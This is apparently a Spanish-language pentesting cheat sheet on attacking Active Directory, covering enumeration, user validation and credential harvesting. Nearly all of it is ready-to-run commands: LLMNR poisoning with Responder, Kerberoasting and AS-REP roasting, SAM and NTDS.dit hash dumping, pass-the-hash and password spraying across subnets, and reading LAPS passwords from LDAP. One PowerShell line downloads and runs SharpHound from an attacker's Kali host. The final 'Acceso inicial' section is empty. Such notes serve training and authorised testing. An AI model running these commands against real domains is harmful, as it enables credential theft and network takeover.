
# Enumeracion y acceso inicial

Esta seccion abarcara tecnicas de enumeracion desde fuera del entorno AD pasando por la validacion de usuarios y password minning hasta conseguir el acceso inicial.

## Herramientas
* Impacket 
* Responder[https://github.com/SpiderLabs/Responder]

````
responder -I <interfaz> --lm -v
````
* Mimikatz
* CrackMapExec
* Kerbrute[https://github.com/ropnop/kerbrute/releases]

````
./kerbrute userenum --dc <TARGET> -d domain.local users.txt
````
* Rubeus[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe]

````
.\Rubeus.exe kerberoast /creduser:domain.local\<usuario> /credpassword:<password>
.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe dump /service:krbtgt
````
* GetNPUsers[https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py] & GetUserSPNs[https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py]

````
GetNPUsers.py domain.local/ -nopass -usersfile users.txt

GetUsersSPN.py domain.local/<usuario>:<password>
GetUsersSPN.py domain.local/<usuario>:<password> -request
````
* Invoke-Kerberoast.ps1[https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1] 

````
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat
````
* PowerView.ps1[https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]
* SharpHound.ps1[https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1]
  
````
IEX((New-Object Net.WebClient).DownloadString('https://<KALIIP/SharpHound.ps1>')
Invoke-Bloodhound -CollectionMethod All
````
* Secretsdump[https://github.com/fortra/impacket/blob/master/examples/secretsdump.py]
  
````
# NTDS dump
secretsdump.py -ntds ntds.dit -system system local 

# SAM dump con autenticacion
secretsdump.py domain.local/<usuario>:<password>@<TARGET>
secretsdump.py -hashes :<hashNTLM> 'domain.local/<host>$@<domainname>'
````


## NMAP 

Al hacer un escaneo de puertos en un entorno de Active Directory en especial si el escaneo lo hacemos directamente contra el Domain Controller nos encontraremos los siguientes puertos:

+ TCP/UDP port 53: DNS
+ TCP/UDP port 88: Kerberos authentication
+ TCP/UDP port 135: RPC
+ TCP/UDP port 137-138: NetBIOS
+ TCP/UDP port 389: LDAP
+ TCP/UDP port 445: SMB
+ TCP/UDP port 464: Kerberos password change
+ TCP/UDP port 636: LDAP SSL
+ TCP/UDP port 3268-3269: Global catalog

Adicionalmente dependiendo del entorno AD este puede tener varias caracteristicas y componentes asi como interactuar con diferentes servicios y aplicaciones por lo que podemos encontrarnos mas puertos comunes:

+ TCP port 80: HTTP
+ TCP port 443: HTTPS
+ TCP port 445: SMB

De modo que tenemos dos maneras de conseguir acceso inicial al AD:
1. Autenticandonos en alguno de los servicios
2. Explotando las vulnerabilidades de alguna aplicacion o servicio.

## Enumeracion de usuarios
## SMB

````bash
nmap -p 445 --script=smb-enum* <TARGET>  # Principalmente nos interesa enumerar usuarios
nmap -p 445  --script=smb-vuln* <TARGET> # MS17-010, MS14-025
````

* SMBMap
````bash
smbmap -H <TARGET>
````

* smbclient
````bash
smbclient -L <TARGET> -N
````

* CrackMapExec
````bash
# Escaneo del target 
crackmapexec smb www.secbank.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb <TARGET> -u "" up ""

# Connect to target using local account
crackmapexec smb <TARGET> -u 'test' -p 'pass123' --local-auth

# Pass the hash contra subredes
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Fuerza bruta y Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
````

````bash
# Enumeración de usuarios
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --users

# Enumeracion de grupos de dominio
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --groups

# Enumeracion de usuarios locales
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --local-users

# Enumeracion de recursos compartidos locales
crackmapexec smb <TARGET> -u 'user' -p 'PASSWORD' --local-auth --shares

# Sesiones activas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --sessions

# Usuarios logeados
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --lusers

# Politica de contraseñas
crackmapexec smb <TARGET> -u 'user' -p 'PASS' --pass-pol
````

````bash
# Dump local SAM hashes
crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam

# Dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb <TARGET> -u UserNAme -p 'PASSWORDHERE' --ntds
````
## RPC

Null session

`rpcclient -U "" <TARGET> -N`

Autenticacion

`rpcclient -U "user%password" <TARGET>`

Enumeracion de usuarios y grupos
````bash
enumdomusers
enumdomgroups
queryuser <0xuser>
querygroupmem 0x200 # Miembros del grupo Domain Admins
rpcclient -U "" <TARGET> -N -c "enumdomusers" # One line comand
````
Enumeracion de impresoras

`enumprinters`

Enumeracion de descripciones

`rpcclient -U "" <TARGET> -N -c "querydispinfo"`

## LDAP

Lo primero es dumpear toda la informacion que contiene LDAP, buscaremos el DomainNamingContext el cual necesitaremos para otros comandos

````bash
nmap -n -sV --script "ldap* and not brute" <TARGET>
ldapsearch -x -b "dc=domain,dc=local" "*" -H "ldap://TARGET"
````

A partir de aqui podemos seguir enumerando con ldapsearch el cual nos permitira filtrar por los distintos campos de la informacion almacenada

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep sAMAccountName: # Enumeracion de las cuentas de usuario
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=hutch,DC=offsec" | grep description # Enumeracion de las descripciones de los usuarios las cuales en ocasiones contienen informacion sensible
````
Para enumerar constraseñas necesitamos dar con el nombre correcto del campo que las contiene, algunos ejemplos:

````bash
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep Pwd
ldapsearch -x -H "ldap://TARGET" -D '' -w '' -b "DC=domain,DC=local" | grep userPassword
````
Teniendo unas credenciales validas podriamos acceder a credenciales de mas alto nivel como las de administrador
````
ldapsearch -D <user>@domain.local -w <password> -o ldif-wrap=no -b 'dc=domain,dc=local' -h domain.local "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd
````

## HTTP/HTTPS
Al realizar la fase de reconocimiento web podemos descubrir una vulnerabilidad en la aplicacion que esta corriendo en uno de los equipos del dominio y permitirnos un acceso inicial a este, pero en otras ocasiones podemos enumerar usuarios bien en el contenido de la pagina o en paneles de login que permitan enumerar usuarios a traves de logins fallidos.

Cuando los usuarios no estan claramente definidos en el contenido web como una seccion de Contact o About Us puede que los nombres de estos coincidan con alguna palabra del contenido, en ese caso usaremos cewl para crear una wordlist personalizada. Esta wordlist posteriormente nos servira para validar usuarios contra kerberos o hacer fuerza bruta con ellos.

````bash
cewl -w wordlist.txt "http://www.test.com/index.php" --with-numbers
````

Tambien se puede dar el caso en el que los nombres de usuario esten claramente definidos en la web con formato Nombre Apellido y que haya que adaptarlo al formato que sea valido para el login. 

> Ejemplo: David Jhons -> david.johns d.jhons

Para esto podemos usar dos herramientas que nos facilitaran el proceso haciendo estas combinaciones automaticamente:

* spindrift
````bash
python3 spindrift.py users.txt --format {f}{last}
python3 spindrift.py users.txt --format {f}.{last}
python3 spindrift.py users.txt --format {first}.{last}
python3 spindrift.py users.txt --format {first}{l}
python3 spindrift.py users.txt --format {first}.{l}
````
![image](https://github.com/n3masyst/Pentesting/assets/133997401/3e1dce0b-3aad-4aa0-8798-1325e62e5c4b)

* cupp
````bash
python3 cupp.py -i   # Nos abrira una consola interactiva donde ira pidiendonos los datos
````

![image](https://github.com/n3masyst/Pentesting/assets/133997401/5c0d1adf-a902-494c-8695-bf657440c5f8)

> Tambien se pueden enumerar usuarios a traves de herramientas de enumeracion orientadas a CMS o aplicaciones web como WPscan o Drupescan

## Validacion de usuarios
## Kerberos
Kerbrute utiliza la fase de pre-autenticación para enumerar usuarios y hashes de contraseñas. En esta fase nos interesa validar todos los usuarios posibles.
> Podemos tener la lista de usuarios enumerados en otros servicios en los pasos anteriores o en caso de no tener ninguno hacer fuerza bruta con un diccionario de usuarios.

````
./kerbrute userenum --dc <TARGET> -d domain.local users.txt
./kerbrute userenum --dc <TARGET> -d domain.local SecLists/Usernames/xato-net-10-million-usernames.txt
````

## Crackmapexec
````
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"

````
## Obtencion de credenciales/hashes

El proceso de recoleccion de credenciales de autenticacion se podria clasificar en 4 metodos:
* Enumeracion de servicios con credenciales almacenadas de manera insegura
  * SMB
    * Reconocimiento de estructura SYSVOL y dumpeo de Groups.xml -> `Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml`
    * Archivos con credenciales almacenadas
    * Copia de seguridad del SAM
  * Credenciales guardadas en la descripcion de los usuarios en RPC y LDAP
  * Credenciales guardadas en claves de registro
    
* Explotacion de preautenticacion de kerberos
  * AS-REP Roast
  ````bash
  GetNPUsers.py test.local/ -no-pass -usersfile usernames.txt
  ````
  * Kerberoasting
  ````bash
  GetUserSPNs.py test.local/john:password123
  GetUserSPNs.py test.local/john:password123 -request
  ````
* Conseguir una conexion del lado del servidor para obtener un hash de usuario
  * SSRF
  * SMB SCF attack
  * DNS Request
* Fuerza bruta
  * SMB CrackMapExec
  ````bash
  crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
  crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
  crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
  crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
  ````
  * RDP Crowbar
  ````bash
  crowbar -b rdp -s 10.11.1.24/32 -U userlist.txt -C passlist.txt
  ````
 ## Dumpeo de estructura del AD

 Una vez tenemos credenciales validas aunque sean de usuario con un nivel de privilegios bajo nos permitira obtener informacion importante del AD

 * Bloodhound-python
  ````bash
  bloodhound-python -c All -u <user> -p <password> -ns <host> -d test.local
  ````
 * ldapdomaindump

 > Esta herramienta nos permitira ver de una manera ordenada y visual los usuarios y grupos del dominio, además aporta informacion importante ya que podremos identificar los usuarios pertenecientes al grupo Domain Admins o al grupo de administracion remota de windows.

  ````bash
  ldapdomaindump -u test.local\<user> -p '<password>' <TARGET>
  ````
 * Claves de registro
  ````bash
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM
    reg.py -hashes :<hash> test.local/john:@10.10.10.1 query -keyName HKLM

    # Key names
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKLM
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKCU
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKCR
    reg.py test.local/john:password123@10.10.10.1 query -keyName HKU
  ````
 * SAM
 ````bash
 crackmapexec smb <TARGET> -u 'Administrator' -p 'PASS' --local-auth --sam   # Normalmente esto requerira el nivel de privilegios de un usuario Administrador
 ````

## Acceso inicial

